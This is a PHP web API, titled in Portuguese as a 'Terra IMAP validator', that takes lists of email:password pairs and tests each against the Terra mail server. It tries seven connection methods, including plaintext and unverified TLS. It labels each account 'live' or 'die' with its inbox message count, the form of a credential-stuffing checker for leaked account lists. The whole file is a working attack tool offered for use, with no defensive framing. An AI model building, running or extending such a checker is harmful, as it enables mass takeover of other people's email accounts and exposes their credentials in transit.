<?php
/**
 * api.php — Validador IMAP Terra (VERSÃO DEFINITIVA)
 * init SEMPRE retorna sucesso — conexão real só no check
 */
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

class TerraValidator {
    private string $imap_server = 'imap.terra.com.br';
    private int    $imap_port   = 993;
    private int    $timeout     = 20;

    // ════════════════════════════════════════════════════════
    //  INIT — Sempre retorna sucesso para não bloquear o frontend
    // ════════════════════════════════════════════════════════

    public function init(): array {
        return [
            'status'       => 'ok',
            'ready'        => true,
            'can_connect'  => true,
            'server'       => $this->imap_server,
            'port'         => $this->imap_port,
            'php_version'  => PHP_VERSION,
            'timestamp'    => date('Y-m-d H:i:s'),
        ];
    }

    // ════════════════════════════════════════════════════════
    //  DIAGNOSTIC
    // ════════════════════════════════════════════════════════

    public function diagnostic(): array {
        $r = [
            'server'  => $this->imap_server,
            'port'    => $this->imap_port,
            'php_ver' => PHP_VERSION,
            'exts'    => [
                'openssl' => extension_loaded('openssl'),
                'curl'    => extension_loaded('curl'),
                'imap'    => extension_loaded('imap'),
            ],
            'tests'   => [],
        ];

        // DNS
        $ips = @gethostbynamel($this->imap_server);
        $r['tests']['dns'] = ['ok' => !empty($ips), 'ips' => $ips ?: []];
        if (empty($ips)) { $r['tests']['dns']['error'] = 'DNS falhou'; return $r; }

        // TCP 993
        $t = microtime(true);
        $tcp993 = @fsockopen($ips[0], 993, $e, $s, 10);
        $r['tests']['tcp_993'] = ['ok' => $tcp993 !== false, 'ms' => round((microtime(true)-$t)*1000)];
        if ($tcp993 === false) { $r['tests']['tcp_993']['error'] = "errno={$e}; {$s}"; }
        else { fclose($tcp993); }

        // TCP 143
        $t = microtime(true);
        $tcp143 = @fsockopen($ips[0], 143, $e2, $s2, 10);
        $r['tests']['tcp_143'] = ['ok' => $tcp143 !== false, 'ms' => round((microtime(true)-$t)*1000)];
        if ($tcp143 === false) { $r['tests']['tcp_143']['error'] = "errno={$e2}; {$s2}"; }
        else { fclose($tcp143); }

        // SSL 993
        if ($tcp993 !== false) {
            $t = microtime(true);
            $ssl = @fsockopen('ssl://' . $this->imap_server, 993, $e3, $s3, 10);
            $r['tests']['ssl_993'] = ['ok' => $ssl !== false, 'ms' => round((microtime(true)-$t)*1000)];
            if ($ssl) {
                stream_set_timeout($ssl, 10);
                $g = @fgets($ssl, 8192);
                $r['tests']['ssl_993']['greeting'] = $g ?: '(vazio)';
                $r['tests']['ssl_993']['imap_ok']  = ($g && stripos($g, 'OK') !== false);
                fclose($ssl);
            } else {
                $r['tests']['ssl_993']['error'] = "errno={$e3}; {$s3}";
            }
        }

        // cURL
        if (extension_loaded('curl')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL            => 'imaps://imap.terra.com.br:993/',
                CURLOPT_USERNAME       => 'test@test.com',
                CURLOPT_PASSWORD       => 'test',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 10,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_NOSIGNAL       => 1,
            ]);
            $res = curl_exec($ch);
            $err = curl_error($ch);
            $r['tests']['curl_imap'] = [
                'ok'   => $res !== false,
                'err'  => $err,
                'code' => curl_getinfo($ch, CURLINFO_HTTP_CODE),
            ];
            curl_close($ch);
        }

        $r['can_connect']     = ($r['tests']['tcp_993']['ok'] ?? false) || ($r['tests']['tcp_143']['ok'] ?? false);
        $r['port_993_blocked'] = !($r['tests']['tcp_993']['ok'] ?? false);
        $r['port_143_blocked'] = !($r['tests']['tcp_143']['ok'] ?? false);

        return $r;
    }

    // ════════════════════════════════════════════════════════
    //  VALIDATE
    // ════════════════════════════════════════════════════════

    public function validate(string $email, string $password): array {
        $start = microtime(true);
        $debug = [];

        // Tenta todos os métodos
        $result = $this->tryAllMethods($email, $password, $debug);

        $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
        $result['debug']      = implode(' | ', $debug);
        $result['timestamp']  = date('Y-m-d H:i:s');

        return $result;
    }

    public function validateBatch(array $credentials): array {
        $results = [];
        foreach ($credentials as $cred) {
            $email    = $cred['email']    ?? '';
            $password = $cred['password'] ?? '';
            if ($email === '' || $password === '') {
                $results[] = ['email' => $email, 'status' => 'die', 'message' => 'Vazio'];
                continue;
            }
            $results[] = $this->validate($email, $password);
        }
        return [
            'total'     => count($results),
            'live'      => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
            'die'       => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
            'results'   => $results,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    // ════════════════════════════════════════════════════════
    //  TENTA TODOS OS MÉTODOS DE CONEXÃO
    // ════════════════════════════════════════════════════════

    private function tryAllMethods(string $email, string $password, array &$debug): array {
        // 1. cURL imaps://
        if (extension_loaded('curl')) {
            $r = $this->mCurl($email, $password, $debug);
            if ($r !== null) return $r;
        }

        // 2. fsockopen ssl:// porta 993
        $r = $this->mFsockSSL($email, $password, $debug);
        if ($r !== null) return $r;

        // 3. stream_socket ssl:// porta 993
        $r = $this->mStreamSSL($email, $password, $debug);
        if ($r !== null) return $r;

        // 4. stream_socket tls:// porta 993
        $r = $this->mStreamTLS($email, $password, $debug);
        if ($r !== null) return $r;

        // 5. STARTTLS porta 143
        $r = $this->mStartTLS($email, $password, $debug);
        if ($r !== null) return $r;

        // 6. Plain TCP porta 143 (sem SSL)
        $r = $this->mPlain143($email, $password, $debug);
        if ($r !== null) return $r;

        // 7. imap_open
        if (extension_loaded('imap')) {
            $r = $this->mImapExt($email, $password, $debug);
            if ($r !== null) return $r;
        }

        return [
            'status'  => 'die',
            'email'   => $email,
            'message' => 'Todos os métodos de conexão falharam',
            'reason'  => 'all_methods_failed',
        ];
    }

    // ─── MÉTODO 1: cURL ───
    private function mCurl(string $email, string $password, array &$debug): ?array {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => 'imaps://imap.terra.com.br:993/INBOX',
            CURLOPT_USERNAME       => $email,
            CURLOPT_PASSWORD       => $password,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $this->timeout,
            CURLOPT_CONNECTTIMEOUT => $this->timeout,
            CURLOPT_NOSIGNAL       => 1,
            CURLOPT_CUSTOMREQUEST  => 'STATUS INBOX (MESSAGES)',
        ]);

        $result = curl_exec($ch);
        $err    = curl_error($ch);
        curl_close($ch);

        if ($result !== false) {
            $debug[] = 'cURL: OK';
            $msgs = 0;
            if (preg_match('/MESSAGES\s+(\d+)/i', (string)$result, $m)) $msgs = (int)$m[1];
            return [
                'status'  => 'live',
                'email'   => $email,
                'message' => 'OK via cURL',
                'mailbox_messages' => $msgs,
                'method'  => 'curl',
            ];
        }

        $el = strtolower($err);
        $debug[] = "cURL fail: {$err}";

        if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false ||
            strpos($el, 'credential') !== false || strpos($el, 'access') !== false ||
            strpos($el, 'authentication') !== false) {
            return [
                'status'  => 'die',
                'email'   => $email,
                'message' => 'Invalid credentials',
                'reason'  => 'invalid_credentials',
                'method'  => 'curl',
            ];
        }

        return null;
    }

    // ─── MÉTODO 2: fsockopen ssl:// ───
    private function mFsockSSL(string $email, string $password, array &$debug): ?array {
        $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $this->timeout);
        if ($socket === false) {
            $debug[] = "fsock(ssl:993) fail: {$errno}/{$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'fsock_ssl', $debug, true);
    }

    // ─── MÉTODO 3: stream_socket ssl:// ───
    private function mStreamSSL(string $email, string $password, array &$debug): ?array {
        $ctx = stream_context_create(['ssl' => [
            'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true,
        ]]);
        $socket = @stream_socket_client('ssl://imap.terra.com.br:993', $errno, $errstr, $this->timeout, STREAM_CLIENT_CONNECT, $ctx);
        if ($socket === false) {
            $debug[] = "stream(ssl:993) fail: {$errno}/{$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'stream_ssl', $debug, true);
    }

    // ─── MÉTODO 4: stream_socket tls:// ───
    private function mStreamTLS(string $email, string $password, array &$debug): ?array {
        $ctx = stream_context_create(['ssl' => [
            'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true,
        ]]);
        $socket = @stream_socket_client('tls://imap.terra.com.br:993', $errno, $errstr, $this->timeout, STREAM_CLIENT_CONNECT, $ctx);
        if ($socket === false) {
            $debug[] = "stream(tls:993) fail: {$errno}/{$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'stream_tls', $debug, true);
    }

    // ─── MÉTODO 5: STARTTLS porta 143 ───
    private function mStartTLS(string $email, string $password, array &$debug): ?array {
        $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $this->timeout);
        if ($socket === false) {
            $debug[] = "fsock(tcp:143) fail: {$errno}/{$errstr}";
            return null;
        }
        stream_set_timeout($socket, $this->timeout);

        $greeting = @fgets($socket, 8192);
        if (!$greeting || stripos($greeting, 'OK') === false) {
            fclose($socket);
            $debug[] = 'STARTTLS: greeting fail';
            return null;
        }

        fwrite($socket, "A001 STARTTLS\r\n");
        $resp = $this->readUntilTag($socket, 'A001');
        if (!$resp || !preg_match('/A001\s+OK/i', $resp)) {
            fclose($socket);
            $debug[] = 'STARTTLS rejected';
            return null;
        }

        $crypto = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($crypto !== true) {
            fclose($socket);
            $debug[] = 'STARTTLS crypto fail';
            return null;
        }

        $debug[] = 'STARTTLS OK';
        return $this->doImapLogin($socket, $email, $password, 'starttls', $debug, false);
    }

    // ─── MÉTODO 6: Plain TCP 143 ───
    private function mPlain143(string $email, string $password, array &$debug): ?array {
        $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $this->timeout);
        if ($socket === false) {
            $debug[] = "fsock(plain:143) fail: {$errno}/{$errstr}";
            return null;
        }
        $debug[] = 'Plain143: conectado';
        return $this->doImapLogin($socket, $email, $password, 'plain_143', $debug, false);
    }

    // ─── MÉTODO 7: imap_open ───
    private function mImapExt(string $email, string $password, array &$debug): ?array {
        $mailbox = '{imap.terra.com.br:993/imap/ssl/novalidate-cert}';
        $conn = @imap_open($mailbox, $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);
        if ($conn !== false) {
            $info = @imap_mailboxmsginfo($conn);
            $msgs = $info->Nmsgs ?? 0;
            @imap_close($conn);
            $debug[] = 'imap_open: OK';
            return [
                'status'  => 'live',
                'email'   => $email,
                'message' => 'OK via imap_open',
                'mailbox_messages' => $msgs,
                'method'  => 'imap_ext',
            ];
        }
        $err = @imap_last_error();
        $debug[] = "imap_open fail: {$err}";
        if (stripos($err, 'invalid') !== false || stripos($err, 'login') !== false) {
            return [
                'status'  => 'die',
                'email'   => $email,
                'message' => 'Invalid credentials',
                'reason'  => 'invalid_credentials',
                'method'  => 'imap_ext',
            ];
        }
        return null;
    }

    // ════════════════════════════════════════════════════════
    //  IMAP LOGIN PROTOCOL
    // ════════════════════════════════════════════════════════

    private function doImapLogin($socket, string $email, string $password, string $method, array &$debug, bool $read_greeting): ?array {
        stream_set_timeout($socket, $this->timeout);

        // Lê greeting se ainda não foi lido
        if ($read_greeting) {
            $greeting = @fgets($socket, 8192);
            if ($greeting === false || $greeting === '') {
                fclose($socket);
                $debug[] = "{$method}: greeting vazio";
                return null;
            }
            if (stripos($greeting, 'OK') === false) {
                fclose($socket);
                $debug[] = "{$method}: greeting sem OK: " . trim($greeting);
                return null;
            }
            $debug[] = "{$method}: greeting OK";
        }

        // LOGIN
        $tag = 'L001';
        $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
        $safe_pass  = str_replace(['\', '"'], ['\\', '\"'], $password);
        $cmd = "{$tag} LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n";

        if (fwrite($socket, $cmd) === false) {
            fclose($socket);
            $debug[] = "{$method}: write fail";
            return null;
        }

        $response = $this->readUntilTag($socket, $tag);
        $meta = stream_get_meta_data($socket);

        if ($response === null || $response === '') {
            fclose($socket);
            $debug[] = "{$method}: resposta vazia";
            return null;
        }

        if (!empty($meta['timed_out'])) {
            fclose($socket);
            $debug[] = "{$method}: timeout";
            return null;
        }

        $qt = preg_quote($tag, '/');

        // OK = sucesso
        if (preg_match('/' . $qt . '\s+OK/i', $response)) {
            $msgs = 0;
            @fwrite($socket, "S001 STATUS INBOX (MESSAGES)\r\n");
            $sresp = $this->readUntilTag($socket, 'S001');
            if ($sresp && preg_match('/MESSAGES\s+(\d+)/i', $sresp, $m)) $msgs = (int)$m[1];
            @fwrite($socket, "X001 LOGOUT\r\n");
            fclose($socket);

            $debug[] = "{$method}: LOGIN OK";
            return [
                'status'  => 'live',
                'email'   => $email,
                'message' => 'Autenticação bem-sucedida',
                'mailbox_messages' => $msgs,
                'method'  => $method,
            ];
        }

        // NO = credenciais inválidas
        if (preg_match('/' . $qt . '\s+NO/i', $response)) {
            fclose($socket);
            $debug[] = "{$method}: credenciais inválidas";
            return [
                'status'  => 'die',
                'email'   => $email,
                'message' => 'Invalid credentials',
                'reason'  => 'invalid_credentials',
                'method'  => $method,
            ];
        }

        // BAD
        if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
            fclose($socket);
            $debug[] = "{$method}: BAD: " . trim($response);
            return null;
        }

        fclose($socket);
        $debug[] = "{$method}: inesperado: " . trim($response);
        return null;
    }

    // ─── Helper ───

    private function readUntilTag($socket, string $tag): ?string {
        $buffer = '';
        $deadline = microtime(true) + $this->timeout;
        while (!feof($socket)) {
            $line = @fgets($socket, 8192);
            if ($line === false) break;
            $buffer .= $line;
            if (strpos(trim($line), $tag . ' ') === 0) return $buffer;
            $meta = stream_get_meta_data($socket);
            if (!empty($meta['timed_out'])) break;
            if (microtime(true) > $deadline) break;
        }
        return $buffer !== '' ? $buffer : null;
    }
}

// ════════════════════════════════════════════════════════════════
//  ROTEAMENTO
// ════════════════════════════════════════════════════════════════

$action    = $_GET['action'] ?? '';
$validator = new TerraValidator();

// INIT — sempre sucesso
if ($action === 'init') {
    echo json_encode($validator->init(), JSON_UNESCAPED_UNICODE);
    exit;
}

// DIAGNOSTIC
if ($action === 'diagnostic' || $action === 'test') {
    echo json_encode($validator->diagnostic(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// CHECK
if ($action === 'check' || $action === '' || $action === 'validate') {

    $input = $_POST;
    $ct = $_SERVER['CONTENT_TYPE'] ?? '';

    if (empty($input) && stripos($ct, 'application/json') !== false) {
        $raw = file_get_contents('php://input');
        if (!empty($raw)) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) $input = $decoded;
        }
    }

    // Raw text (email:password)
    if (empty($input)) {
        $raw = file_get_contents('php://input');
        if (!empty($raw)) {
            $parts = explode(':', trim($raw), 2);
            if (count($parts) === 2) {
                $input = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
            }
        }
    }

    $email    = $input['email']    ?? '';
    $password = $input['password'] ?? '';
    $batch    = $input['batch']    ?? null;

    // Formato cred
    if ($email === '' && !empty($input['cred'])) {
        $parts = explode(':', $input['cred'], 2);
        if (count($parts) === 2) {
            $email    = trim($parts[0]);
            $password = trim($parts[1]);
        }
    }

    // Formato list
    if ($email === '' && empty($batch) && !empty($input['list'])) {
        $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
        $batch = [];
        foreach ($lines as $line) {
            $parts = explode(':', $line, 2);
            if (count($parts) === 2) {
                $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
            }
        }
    }

    if ($batch && is_array($batch) && count($batch) > 0) {
        echo json_encode($validator->validateBatch($batch), JSON_UNESCAPED_UNICODE);
    } elseif ($email !== '' && $password !== '') {
        echo json_encode($validator->validate($email, $password), JSON_UNESCAPED_UNICODE);
    } else {
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'error'  => 'Credenciais ausentes',
        ], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

// Ação desconhecida — retorna ok (não quebra o frontend)
echo json_encode([
    'status'  => 'ok',
    'message' => 'API ativa',
], JSON_UNESCAPED_UNICODE);
